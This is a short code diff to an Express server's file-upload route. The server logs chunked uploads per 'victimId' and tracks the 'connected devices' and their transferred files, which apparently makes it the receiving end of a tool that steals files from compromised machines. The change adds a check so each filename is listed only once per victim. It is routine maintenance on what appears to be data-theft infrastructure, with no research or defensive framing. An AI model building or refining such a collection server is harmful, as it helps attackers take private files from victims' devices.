@@ -126,7 +126,11 @@ app.post('/upload', (req, res) => {
       console.log(`✅ Chunk ${chunkIndex} of ${totalChunks} received for file: ${filename}`);
       victimFileCounts[victimId] += 1;
       connectedDevices[victimId].filesTransferred += 1;
-      connectedDevices[victimId].fileList.push(filename);
+
+      // Add the file to the list only if it's not already there
+      if (!connectedDevices[victimId].fileList.includes(filename)) {
+        connectedDevices[victimId].fileList.push(filename);
+      }
 
       if (chunkIndex === totalChunks) {
         console.log(`✅ File upload complete: ${filename}`);
